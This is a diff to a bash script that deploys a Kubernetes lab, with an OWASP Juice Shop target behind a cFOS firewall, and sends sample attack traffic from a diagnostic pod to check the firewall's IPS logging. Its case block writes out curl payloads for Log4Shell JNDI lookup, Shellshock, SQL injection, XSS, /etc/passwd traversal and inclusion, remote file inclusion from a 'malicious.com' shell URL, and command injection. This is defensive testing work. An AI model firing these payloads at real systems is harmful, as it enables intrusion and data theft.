@@ -508,46 +508,173 @@ echo sleep 10
 sleep 10
 check_network_connectivity ${DST_IP_TOCHECK} ${DST_TCP_PORT_TOCHECK}
 create_and_apply_juiceshop_yaml
+create_and_apply_diag2_yaml
 }
 
 function send_attack_traffic() {
-echo send attack traffic to juniceshop
-service_address="juiceshop-service.security.svc.cluster.local"
+echo test_diag2 'app=diag2' 'backend' 'juiceshop-service' 'security' 'normal'
+test_diag2 'app=diag2' 'backend' 'juiceshop-service' 'security' 'normal'
 
-payload='curl --max-time 5 '
-echo run_curl_in_pod "$payload" "$service_address"
-run_curl_in_pod "$payload" "$service_address"
-
-payload='curl --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
-echo run_curl_in_pod "$payload" "$service_address"
-run_curl_in_pod "$payload" "$service_address"
-
-sleep 5
-payload='curl --max-time 5 -H "User-Agent: {jndi:ldap://example.com/a}"'
-echo run_curl_in_pod "$payload" "$service_address"
-run_curl_in_pod "$payload" "$service_address"
-
-sleep 5
-payload='curl --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
-echo run_curl_in_pod "$payload" "$service_address"
-run_curl_in_pod "$payload" "$service_address"
 }
 
-function run_curl_in_pod() {
-    # Parameters
-    LOCAL_CURL_COMMAND=$1
-    JUICE_SHOP_SVC=$2
+function test_diag2() {
+    # Parameters from command line - now all 4 are expected from CLI, with defaults inside function
+    label_selector_source_pod="${1:-app=diag2}"
+    namespace_source_pod="${2:-backend}"
+    target_svc_name="${3:-juiceshop-service}"
+    target_svc_namespace="${4:-security}"
+    payload_type="${5:-normal}"
+    logfile_name="${6:-traffic.0}"
 
-    # Get the pod name with label app=diag
-    POD_NAME=$(kubectl get pods -l app=diag -o jsonpath='{.items[0].metadata.name}')
-    
+    # Define the Juice Shop service address in a variable using parameters
+    local service_address="http://${target_svc_name}.${target_svc_namespace}.svc.cluster.local:3000/"
+    local cfos_pod_name=$(kubectl get pods -l app=firewall -o jsonpath='{.items[0].metadata.name}')
+
+   
+
+
+    case "$payload_type" in
+    normal)
+        local payload='curl -s -I --max-time 5'
+        local logfile_name="traffic.0"
+        ;;
+    log4j)
+        local payload='curl -s --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
+        local logfile_name="ips.0"
+        ;;
+    shellshock)
+        local payload='curl -s --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
+        local logfile_name="ips.0"
+        ;;
+    sql_injection)
+        local payload='curl -s --max-time 5 --data "username=admin&password= OR 1=1 -- -"'
+        local logfile_name="ips.0"
+        ;;
+    xss)
+        local payload='curl -s --max-time 5 --data "search=<script>alert(1)</script>"'
+        local logfile_name="ips.0"
+        ;;
+    lfi)
+        local payload='curl -s --max-time 5 "http://target.com/index.php?page=../../../../etc/passwd"'
+        local logfile_name="ips.0"
+        ;;
+    rfi)
+        local payload='curl -s --max-time 5 "http://target.com/index.php?page=http://malicious.com/shell.txt"'
+        local logfile_name="ips.0"
+        ;;
+    cmd_injection)
+        local payload='curl -s --max-time 5 --data "input=1; cat /etc/passwd"'
+        local logfile_name="ips.0"
+        ;;
+    directory_traversal)
+        local payload='curl -s --max-time 5 "http://target.com/../../../../etc/passwd"'
+        local logfile_name="ips.0"
+        ;;
+    user_agent_malware)
+        local payload='curl -s --max-time 5 -H "User-Agent: BlackSun"'
+        local logfile_name="ips.0"
+        ;;
+    *)
+        local payload='curl -s -I --max-time 5'
+        local logfile_name="ips.0"
+        ;;
+esac
+
+
+    run_curl_in_pod "$payload" "$service_address"
+    echo "kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/${logfile_name}"
+    kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/${logfile_name}
+
+}
+
+
+run_curl_in_pod() {
+    # Parameters
+    LOCAL_CURL_COMMAND="$1"
+    JUICE_SHOP_SVC="$2"
+
+    # Using local variables to get label and namespace from test_diag2 scope
+    local pod_label_selector="${label_selector_source_pod}"
+    local pod_namespace="${namespace_source_pod}"
+
+    # Get the pod name with the specified label selector and namespace
+    POD_NAME=$(kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" -o jsonpath='{.items[0].metadata.name}')
+
     if [ -z "$POD_NAME" ]; then
-        echo "No pod found with label app=diag"
+        echo "No pod found with label '$pod_label_selector' in namespace '$pod_namespace'"
         exit 1
     fi
 
     # Run the curl command inside the pod
-    kubectl exec $POD_NAME -- bash -c "$LOCAL_CURL_COMMAND http://$JUICE_SHOP_SVC:3000/api/Products"
+    echo "kubectl exec $POD_NAME --namespace $pod_namespace -- bash -c \"$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC\""
+    echo "waiting result"
+    kubectl exec $POD_NAME --namespace "$pod_namespace" -- bash -c "$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC"
+    sleep 2
+}
+
+function create_and_apply_diag2_yaml() {
+     YAML_FILE="diag2_deployment.yaml"
+     local namespacename="backend"
+     local appname="diag2"
+     cat <<EOF > $YAML_FILE
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: ${namespacename}
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ${appname}
+  namespace: ${namespacename}
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: ${appname}
+  template:
+    metadata:
+      labels:
+        app: ${appname}
+        protectedby: cfos
+    spec:
+      containers:
+        - name: praqma
+          image: praqma/network-multitool
+          ports:
+            - containerPort: 80
+          args:
+            - /bin/sh
+            - -c
+            - /usr/sbin/nginx -g "daemon off;"
+          securityContext:
+            capabilities:
+              add: ["NET_ADMIN","SYS_ADMIN","NET_RAW"]
+
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: ${appname}-service
+  namespace: ${namespacename}
+spec:
+  selector:
+    app: ${appname}
+  ports:
+    - protocol: TCP
+      port: 3000
+      targetPort: 80
+
+EOF
+
+    # Apply the YAML file to Kubernetes
+    kubectl apply -f $YAML_FILE
+
+    # Wait for the deployment to be ready
+    kubectl rollout status deployment/${appname} -n ${namespacename} --timeout=300s
+
+    echo "diag2 deployment with clusterip svc  in namespace ${namespacename} is ready."
 }
 
 function create_and_apply_juiceshop_yaml() {
